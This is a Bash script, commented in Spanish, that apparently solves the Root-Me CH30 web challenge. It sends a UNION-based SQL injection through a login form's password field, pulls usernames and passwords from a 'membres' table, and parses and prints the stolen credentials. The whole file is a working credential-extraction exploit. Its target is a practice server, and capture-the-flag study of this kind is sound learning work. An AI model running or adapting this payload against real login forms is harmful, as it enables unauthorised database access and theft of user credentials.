#!/bin/bash

# ================================================
# EXTRACCIÓN CON DELIMITADORES - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  EXTRACCIÓN CON DELIMITADORES${NC}"
echo -e "${BLUE}========================================${NC}"

# Delimitador único (no aparece en HTML)
DELIM="|||"

echo -e "\n${YELLOW}[+] Extrayendo datos con delimitador '$DELIM'...${NC}"

# Extraer usando delimitador
result=$(curl -s -X POST "$URL" \
    -d "username=admin&password=' UNION SELECT 1,CONCAT('$DELIM',username,'$DELIM'),CONCAT('$DELIM',pass,'$DELIM'),4 FROM membres#" \
    | grep -o "$DELIM.*$DELIM")

echo -e "\n${YELLOW}[+] Resultado crudo:${NC}"
echo "$result"

echo -e "\n${YELLOW}[+] Limpiando delimitadores...${NC}"
clean_result=$(echo "$result" | sed "s/$DELIM//g" | head -1)

if [ -n "$clean_result" ]; then
    echo -e "${GREEN}[✓] Datos encontrados: $clean_result${NC}"
    
    # Intentar separar username y password
    username=$(echo "$clean_result" | cut -d':' -f1)
    password=$(echo "$clean_result" | cut -d':' -f2)
    
    if [ -n "$username" ]; then
        echo -e "${GREEN}[✓] Username: $username${NC}"
    fi
    if [ -n "$password" ]; then
        echo -e "${GREEN}[✓] Password: $password${NC}"
    fi
else
    echo -e "${RED}[✗] No se encontraron datos${NC}"
fi

echo -e "\n${BLUE}========================================${NC}"
